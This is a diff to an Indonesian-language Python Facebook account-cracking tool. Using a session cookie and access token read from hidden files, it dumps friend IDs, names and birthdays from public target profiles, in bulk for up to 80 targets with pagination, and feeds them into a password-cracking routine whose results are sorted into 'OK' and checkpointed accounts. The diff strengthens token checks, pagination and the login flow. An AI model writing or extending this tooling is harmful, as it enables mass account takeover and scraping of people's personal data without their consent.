@@ -872,18 +872,11 @@ def banner():
 def login123():
     os.system("clear")
     banner()
-    Console().print(
-        Panel(
-            f"""{P2}[{color_text}01{P2}].Login Menggunakan Cookie\n[{color_text}02{P2}].{M2}Keluar""",
-            width=60,
-            style=f"{color_panel}",
-            title="[bold green]Login",
-        )
-    )
-    bryn = console.input(f" {H2}• {P2}pilih menu : ")
-    if bryn in ["1", "01"]:
+    Console().print(Panel(f"""{P2}[{color_text}01{P2}].Login Menggunakan Cookie\n[{color_text}02{P2}].{M2}Keluar""",width=60,style=f"{color_panel}",title="[bold green]Login"))
+    fansph = console.input(f" {H2}• {P2}pilih menu : ")
+    if fansph in ["1", "01"]:
         logincoki()
-    elif bryn in ["2", "02"]:
+    elif fansph in ["2", "02"]:
         exit()
     else:
         Console().print(f" {H2}• {P2}[bold red]Pilihan Tidak Diketahui!", end="\r")
@@ -893,20 +886,32 @@ def login123():
 
 def login():
     try:
-        token = open(".fantoken.txt", "r").read()
-        cok = open(".fancookie.txt", "r").read()
+        # Membaca token & cookie dari file
+        token = open(".fantoken.txt", "r").read().strip()
+        cok = open(".fancookie.txt", "r").read().strip()
         tokenku.append(token)
+        # **Cek apakah token masih valid**
+        check = requests.get(f"https://graph.facebook.com/me?access_token={token}", cookies={"cookie": cok}).json()
+        if "error" in check:
+            if "Invalid OAuth" in check["error"]["message"] or check["error"]["code"] in [190, 102]:
+                console.print(f" {H2}• {P2}[bold red] Token kadaluarsa atau invalid!")
+                os.system("rm -rf .fantoken.txt && rm -rf .fancookie.txt")
+                login123()  # Minta login ulang
+            elif "checkpoint" in check["error"]["message"]:
+                console.print(f" {H2}• {P2}[bold red] Akun terkena checkpoint!")
+                os.system("rm -rf .fantoken.txt && rm -rf .fancookie.txt")
+                login123()  # Minta login ulang
+        # Jika token valid, masuk ke menu
         try:
             menu()
         except KeyError:
             login123()
         except requests.exceptions.ConnectionError:
-            Console().print(
-                f" {H2}• {P2}[bold red]Problem Internet Connection, Check And Try Again"
-            )
+            console.print(f" {H2}• {P2}[bold red] Problem Internet Connection, Check And Try Again")
             exit()
     except IOError:
         login123()
+
 
 # --------------------[ LOGIN-TOKEN-EAAB ]--------------#
 def logincoki():
@@ -970,11 +975,14 @@ def menu():
         my_name=[]
         my_id=[]
     try:
-        link = ses.get(f"https://graph.facebook.com/me?fields=id,name,friends&access_token={token}",cookies={"cookie": cookie}).json()
-        for c in link["friends"]["data"]:
-            temanku.append(c["id"] + "|" + c["name"])
-    except:
-        pass
+        link = ses.get(f"https://graph.facebook.com/me?fields=id,name,friends.limit(5000)&access_token={token}", cookies={"cookie": cookie}).json()
+        if "friends" in link:
+            for c in link["friends"]["data"]:
+                temanku.append(c["id"] + " | " + c["name"])
+        else:
+            console.print(f" {H2}• {P2}Pertemanan tidak publik atau tidak ada teman yang bisa diambil.")
+    except Exception as e:
+        console.print(f" {H2}• {P2}Gagal mengambil data teman: {str(e)}")
     os.system("clear")
     banner()
     try:
@@ -1006,6 +1014,7 @@ def menu():
         prints(Panel(f"""{P2}masukan id target, pastikan id target bersifat publik""",subtitle=f"{P2}ketik {H2}me{P2} untuk dump dari teman sendiri",width=60,style=f"{color_panel}"))
         idfac = console.input(f" {H2}• {P2}Masukan Id Target :{U2} ")
         dump_publikk(idfac,"",{"cookie":cookie},token)
+        print('\n')
         setting()
     elif HaHi in ["2", "02"]:
         massal()
@@ -1032,62 +1041,74 @@ def dump_publikk(idfac,fields,cookie,token):
         url = ses.get(f"https://graph.facebook.com/{idfac}", params=params, headers=headers, cookies=cookie).json()
         for i in url["friends"]["data"]:
             id.append(i["id"]+"|"+i["name"])
-            sys.stdout.write(f"\r • sedang dump id : {len(id)}")
+            sys.stdout.write(f"\r • sedang dump id, berhasil mendapatkan : {len(id)} ID")
             sys.stdout.flush()
         dump_publikk(idfac,url["friends"]["paging"]["cursors"]["after"],cookie,token)
     except: pass
-# -------------------[ CRACK-Masal ]----------------#
+
+#----------[ CRACK-massal  ]----------#
 def massal():
     try:
-        token = open(".fantoken.txt", "r").read()
-        cok = open(".fancookie.txt", "r").read()
+        token = open(".fantoken.txt", "r").read().strip()
+        cok = open(".fancookie.txt", "r").read().strip()
     except IOError:
+        Console().print(f" {H2}• {P2}Token atau Cookie tidak ditemukan!")
         exit()
     try:
-        Console().print(Panel("[bold white] Mau Berapa Target Yang Mau Di Crack",width=60,style=f"{color_panel}",title="[bold green] Crack Masal [bold white]"))
-        jum = int(input(f" • Masukan : "))
+        Console().print(Panel("[bold white] Masukkan Jumlah Target yang Mau di Crack", width=60, style=color_panel, title="[bold green] Crack Massal [bold white]"))
+        jum = int(input(f" • Masukkan jumlah target: "))
     except ValueError:
-        Console().print(f" {H2}• {P2} Wrong input ")
+        Console().print(f" {H2}• {P2}Input salah, harap masukkan angka!")
         exit()
     if jum < 1 or jum > 80:
-        Console().print(f" {H2}• {P2} Pertemanan Tidak Publik  ")
+        Console().print(f" {H2}• {P2}Jumlah target tidak valid (1-80)")
         exit()
     ses = requests.Session()
-    yz = 0
-    for met in range(jum):
-        yz += 1
-        Console().print(panel("[bold white] Masukkan Target ke " + str(yz) + "",width=60,style=f"{color_panel}"))
-        kl = Console().input(f" {H2}• {P2}Masukan : ")
+    uid = []  # Menyimpan daftar target
+    id = []   # Menyimpan hasil dump
+    # Input ID Target
+    for i in range(jum):
+        Console().print(Panel(f"[bold white] Masukkan Target ke-{i+1}", width=60, style=color_panel))
+        kl = input(f" {H2}• {P2}Masukkan ID Target: ")
         uid.append(kl)
+    # Loop untuk setiap target
     for userr in uid:
         try:
             headers = {"connection": "keep-alive", "accept": "*/*", "sec-fetch-dest": "empty", "sec-fetch-mode": "cors","sec-fetch-site": "same-origin", "sec-fetch-user": "?1","sec-ch-ua-mobile": "?1","upgrade-insecure-requests": "1", "user-agent": "Mozilla/5.0 (Linux; Android 11; AC2003) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36","accept-encoding": "gzip, deflate","accept-language": "id-ID,id;q=0.9"}
-            if len(id)==0:
-                params = {"access_token": token,"fields": f"name,friends.fields(id,name,birthday)"}
-            # else:
-                # params = {"access_token": token,"fields": f"name,friends.fields(id,name,birthday).after({fields})"}
-            url = ses.get(f"https://graph.facebook.com/{userr}", params=params, headers=headers, cookies=cok).json()
-            for i in url["friends"]["data"]:
-                id.append(i["id"]+"|"+i["name"])
-                sys.stdout.write(f"\r • sedang dump id : {len(id)}")
-                sys.stdout.flush()
-            # dump_publikk(userr,url["friends"]["paging"]["cursors"]["after"],cok,token)
+            params = {"access_token": token,"fields": f"name,friends.fields(id,name,birthday)"}
+            url = ses.get(f"https://graph.facebook.com/{userr}", params=params, headers=headers, cookies={"cookie": cok}).json()
+            if "friends" in url:
+                for i in url["friends"]["data"]:
+                    id.append(i["id"] + "|" + i["name"])
+                    sys.stdout.write(f"\r • sedang dump id, berhasil mendapatkan : {len(id)} ID")
+                    sys.stdout.flush()
+                # Pagination (jika ada lebih banyak data)
+                while "paging" in url["friends"] and "next" in url["friends"]["paging"]:
+                    after_cursor = url["friends"]["paging"]["cursors"]["after"]
+                    params["fields"] = f"name,friends.fields(id,name,birthday).after({after_cursor})"
+                    url = ses.get(f"https://graph.facebook.com/{userr}", params=params, headers=headers, cookies={"cookie": cok}).json()
+                    for i in url["friends"]["data"]:
+                        id.append(i["id"] + "|" + i["name"])
+                        sys.stdout.write(f"\r • Sedang dump ID : {len(id)}")
+                        sys.stdout.flush()
+            else:
+                pass
         except (KeyError, IOError):
-            pass
+            Console().print(f" {H2}• {P2}Pertemanan tidak dapat diakses untuk ID {userr}")
         except requests.exceptions.ConnectionError:
-            Console().print(f" {H2}• {P2}Unstable Signal ")
+            Console().print(f" {H2}• {P2}Koneksi tidak stabil!")
             exit()
     try:
         setting()
     except requests.exceptions.ConnectionError:
-        print(f"")
-        Console().print(f" {H2}• {P2}Unstable Signal ")
+        Console().print(f" {H2}• {P2}Koneksi tidak stabil!")
         exit()
     except (KeyError, IOError):
-        Console().print(f" {H2}• {P2}Pertemanan Tidak Public ")
+        Console().print(f" {H2}• {P2}Pertemanan tidak publik!")
         time.sleep(3)
         exit()
 
+#----------[ LIHAT-HASIL-CRACK ]----------#
 def result():
     console.print(Panel(f"""{P2}[{color_text}01{P2}]. Lihat Hasil {K2}CP{P2}
 {P2}[{color_text}02{P2}]. Lihat Hasil {H2}OK{P2}""", width=60, title=f"Hasil Crack", style=color_panel))
@@ -1816,5 +1837,5 @@ if __name__ == "__main__":
         os.system("clear")
     except:
         pass
-    menu()
+    login()
     
